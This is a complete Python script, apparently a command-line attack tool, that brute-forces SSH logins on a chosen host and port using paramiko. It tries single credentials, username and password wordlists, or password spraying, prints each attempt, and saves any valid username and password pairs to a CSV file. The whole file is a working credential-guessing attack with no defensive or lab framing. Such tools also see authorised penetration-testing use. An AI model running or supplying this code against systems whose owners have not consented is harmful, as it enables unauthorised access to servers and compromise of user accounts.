#!/usr/bin/env python3

# DEPENDENCIES
# $ pip install paramiko

# IMPORTS
import argparse 
import csv
from paramiko import SSHClient, AutoAddPolicy
from paramiko.ssh_exception import AuthenticationException, SSHException

# --------------------------------------------------------------------------- ARGUMENTS PARSING ---------------------------------------------------------------------------
parser = argparse.ArgumentParser()

parser.add_argument('-t', '--target', type=str, default='127.0.0.1', help="Target host.")
parser.add_argument('-p', '--port', type=int, default=22, help="Port where the SSH service is running on the target.")
parser.add_argument('-usr', '--username', type=str, help="Single username.")
parser.add_argument('-pwd', '--password', type=str, help="Single password.")
parser.add_argument('-uwl', '--user_wordlist', type=str, help="User wordlist.")
parser.add_argument('-pwl', '--pass_wordlist', type=str, help="Password wordlist.")
parser.add_argument('-o', '--output_file_path', type=str, default="ssh_brute_results.txt", help="File path for the output file")

args = parser.parse_args()

# --------------------------------------------------------------------------- ARGUMENTS VALIDATION ---------------------------------------------------------------------------

usr_args = [args.username, args.user_wordlist]
pwd_args = [args.password, args.pass_wordlist]

## ------------------------- USERNAME ARGS VALIDATION -------------------------
#  Options -usr (--username) and -uwl (--user_wordlist) are not used together.
if all(item is not None for item in usr_args):
    raise Exception("[-] Error: The options -usr (--username) and -uwl (--user_wordlist) cannot be used together.")
    
# One of the options -usr (--username) or -uwl (--user_wordlist) must be specified.
if all(item is None for item in usr_args):
    raise Exception("[-] Error: You must specify one of the following options: -usr (--username) or -uwl (--user_wordlist)")

## ------------------------- PASSWORD ARGS VALIDATION -------------------------

#  Options -pwd (--password) and -pwl (--pass_wordlist) are not used together.
if all(item is not None for item in pwd_args):
    raise Exception("[-] Error: The options -pwd (--password) and -pwl (--pass_wordlist) cannot be used together.")

# One of the options -pwd (--password) or -pwl (--pass_wordlist) must be specified.
if all(item is None for item in pwd_args): 
    raise Exception("[-] Error: You must specify one of the following options: -pwd (--password) or -pwl (--pass_wordlist)")

# --------------------------------------------------------------------------- BRUTEFORCE LOGIC ---------------------------------------------------------------------------

def open_file(path, mode):
    
    try:
        return open(path, mode)
    except:
        raise Exception(f"[-] Error: The file \"{path}\" could not be opened.")
    

def export_credentials(credentials_file_path, credentials):
    try:
        credentials_file = open_file(credentials_file_path, "w")
        file_headers = credentials[0].keys()

        writer = csv.DictWriter(credentials_file, fieldnames=file_headers)

        writer.writeheader() 
        writer.writerows(credentials)
        print(f"[+] Credentials were successfully written to the file: \"{credentials_file_path}\"")
    except:
        raise Exception(f"[-] Error: Failed to write credentials to the file:  \"{credentials_file_path}\"")


# Determine if SSH Autentication was successfull

def check_ssh_auth(hostname, port, usr, pwd):
    print(f"[i] Trying credentials: (Username: {usr} | Password: {pwd})")

    try:
        # SSH client instance
        ssh_client = SSHClient()

        # Add the server's host key automatically
        ssh_client.set_missing_host_key_policy(AutoAddPolicy())

        # Establish the SSH connection
        ssh_client.connect(hostname=hostname, port=port, username=usr, password=pwd)

        print(f"[+] Valid credentials found: ({usr}, {pwd})")

        return True
    
    except (AuthenticationException, SSHException):
        return False
    finally:
        ssh_client.close()

def ssh_brute_single_wordlist(hostname, port, single_elem, single_elem_type, wordlist_path):
    valid_creds = []
    wordlist_handler = open_file(wordlist_path, "rt")

    wl_elem = wordlist_handler.readline().strip()
    while wl_elem:
        match single_elem_type:
            # Traditional Brute-force
            case "username":
            
                ssh_auth_success = check_ssh_auth(hostname, port, single_elem, wl_elem)
                if ssh_auth_success:
                    valid_creds.append({"Username":single_elem, "Password": wl_elem})
                    break

            # Password Spraying
            case "password":
                ssh_auth_success=check_ssh_auth(hostname, port, wl_elem, single_elem)
                if ssh_auth_success:
                    valid_creds.append({"Username":wl_elem, "Password": single_elem})
        
        wl_elem = wordlist_handler.readline().strip()
    
    wordlist_handler.close()
    return valid_creds

def ssh_brute_multi_wordlist(hostname, port, uwl_path, pwl_path):
    valid_creds = []
    uwl_handler = open_file(uwl_path, "rt")

    usr = uwl_handler.readline().strip()
    while usr:
        partial_creds = ssh_brute_single_wordlist(hostname, port, usr,"username", pwl_path)
        valid_creds.extend(partial_creds)

        usr = uwl_handler.readline().strip()

    uwl_handler.close()
    
    return valid_creds

def ssh_brute(hostname, port, usr=None, pwd=None, uwl_path=None, pwl_path=None):

    print(f" ----- Attacking {hostname} on port {port} -----")

    # Single username and password
    if usr and pwd:
        ssh_auth_success =  check_ssh_auth(hostname, port, usr, pwd)
        if ssh_auth_success:
            return [{"Username":usr, "Password":pwd}]
    
    # Single username and password list
    elif usr and pwl_path:
        return ssh_brute_single_wordlist(hostname, port, usr,"username", pwl_path)
    
    # Single password and username list
    elif uwl_path and pwd:
        return ssh_brute_single_wordlist(hostname, port, pwd ,"password", uwl_path)
    
    # Username list and Password list
    elif uwl_path and pwl_path:
        return ssh_brute_multi_wordlist(hostname, port, uwl_path, pwl_path)
    else:
        return {}


credentials = ssh_brute(hostname=args.target, port=args.port, usr=args.username, pwd=args.password, uwl_path=args.user_wordlist, pwl_path=args.pass_wordlist)

if args.output_file_path and credentials:
    export_credentials(args.output_file_path, credentials)
